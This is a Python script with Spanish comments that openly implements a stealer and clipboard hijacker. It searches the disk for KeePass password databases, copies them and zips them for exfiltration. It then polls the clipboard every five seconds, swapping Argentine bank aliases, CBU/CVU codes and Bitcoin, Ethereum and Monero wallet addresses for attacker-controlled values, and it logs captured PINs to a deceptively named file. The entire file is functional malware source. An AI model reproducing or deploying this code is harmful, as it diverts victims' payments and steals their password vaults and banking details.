#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import settings
import pyperclip3 as pc
import re
import glob
import shutil
import time

#Registrar hallazgos en el Log
def loguear_hallazgo(hallazgo, tipo):
    #1 => Abrir archivo
    f = open("no_sospechoso.txt", "a")
    #2 => Escribir hallazgo y tipo (Wallet, CBU, etc)
    f.write("Nuevo hallazgo: "+ hallazgo +" ("+ tipo +").\n")
    #3 => Cerrar archivo
    f.close()

#Preparar archivos para exfiltrar
def exfiltrar_archivos():
    #1 => Crear archivo zip
    shutil.make_archive("Archivo_Inocente", "zip", "./")

#Bases Keepass
def buscar_bases():
    #1 => Búsqueda de bases de datos de KeepassX en el disco
    bases_keepass = glob.glob(settings.patron_keepass, recursive=True)
    #2 => Registrar cada base de datos en el log
    for base in bases_keepass:
        loguear_hallazgo(base, "Base Keepass")
        #3 => Copiar las bases de datos a la carpeta del stealer
        shutil.copy2(base, "./")
    #4 => Si se han encontrado bases de datos, avisar
    if len(bases_keepass) > 0:
        print("🚨 Encontrada Base de datos Keepass. Copiando... 😈")

#Monitorear portapapeles
def monitorear():
    while True:
        #Chequear Alias Bancario
        #1 => Revisar el portapapeles
        victima_portapapeles = pc.paste().decode("utf-8")
        #2 => Compilar la expresión regular (regla que define lo que buscamos)
        mi_patron_alias = re.compile(settings.patron_alias)
        #3 => Comparar portapapeles con reglas de Alias Bancario
        if mi_patron_alias.match(victima_portapapeles):
            pc.copy(settings.atacante_alias)
            print("🚨 Encontrado Alias Bancario. Reemplazando... 😈")
            loguear_hallazgo(victima_portapapeles, "Alias bancario")

        #Chequear Clave Bancaria Uniforme / Clave Virtual Uniforme
        #1 => Revisar el portapapeles
        victima_portapapeles = pc.paste().decode("utf-8")
        #2 => Compilar la expresión regular
        mi_patron_cbu = re.compile(settings.patron_cbu_cvu)
        #3 => Comparar portapapeles con reglas de CBU/CVU
        if mi_patron_cbu.match(victima_portapapeles):
            pc.copy(settings.atacante_cbu_cvu)
            print("🚨 Encontrado Clave Bancaria/Virtual Uniforme. Reemplazando... 😈")
            loguear_hallazgo(victima_portapapeles, "CBU/CVU")

        #Chequear Wallet BTC
        #1 => Revisar el portapapeles
        victima_portapapeles = pc.paste().decode("utf-8")
        #2 => Compilar la expresión regular
        mi_patron_btc = re.compile(settings.patron_wallet_btc)
        #3 => Comparar portapapeles con reglas de BTC
        if mi_patron_btc.match(victima_portapapeles):
            pc.copy(settings.atacante_wallet_btc)
            print("🚨 Encontrado Wallet Bitcoin. Reemplazando... 😈")
            loguear_hallazgo(victima_portapapeles, "Wallet BTC")

        #Chequear Wallet ETH
        #1 => Revisar el portapapeles
        victima_portapapeles = pc.paste().decode("utf-8")
        #2 => Compilar la expresión regular
        mi_patron_eth = re.compile(settings.patron_wallet_eth)
        #3 => Comparar portapapeles con reglas de ETH
        if mi_patron_eth.match(victima_portapapeles):
            pc.copy(settings.atacante_wallet_eth)
            print("🚨 Encontrado Wallet Ethereum Reemplazando... 😈")
            loguear_hallazgo(victima_portapapeles, "Wallet ETH")

        #Chequear Wallet XMR
        #1 => Revisar el portapapeles
        victima_portapapeles = pc.paste().decode("utf-8")
        #2 => Compilar la expresión regular
        mi_patron_xmr = re.compile(settings.patron_wallet_xmr)
        #3 => Comparar portapapeles con reglas de XMR
        if mi_patron_xmr.match(victima_portapapeles):
            pc.copy(settings.atacante_wallet_xmr)
            print("🚨 Encontrado Wallet Monero. Reemplazando... 😈")
            loguear_hallazgo(victima_portapapeles, "Wallet XMR")

        #Chequear PIN
        #1 => Revisar el portapapeles
        victima_portapapeles = pc.paste().decode("utf-8")
        #2 => Compilar la expresión regular
        mi_patron_pin = re.compile(settings.patron_pin)
        #3 => Comparar portapapeles con reglas de PIN
        if mi_patron_pin.match(victima_portapapeles):
            print("🚨 Encontrado PIN. Copiando... 😈")
            loguear_hallazgo(victima_portapapeles, "PIN")
        
        #Esperar 5 segundos
        print("😴 Durmiendo...")
        time.sleep(5)

#Llamar a las funciones en orden
#Buscar bases
buscar_bases()
#Comprimir archivos
exfiltrar_archivos()
#Iniciar monitoreo
monitorear()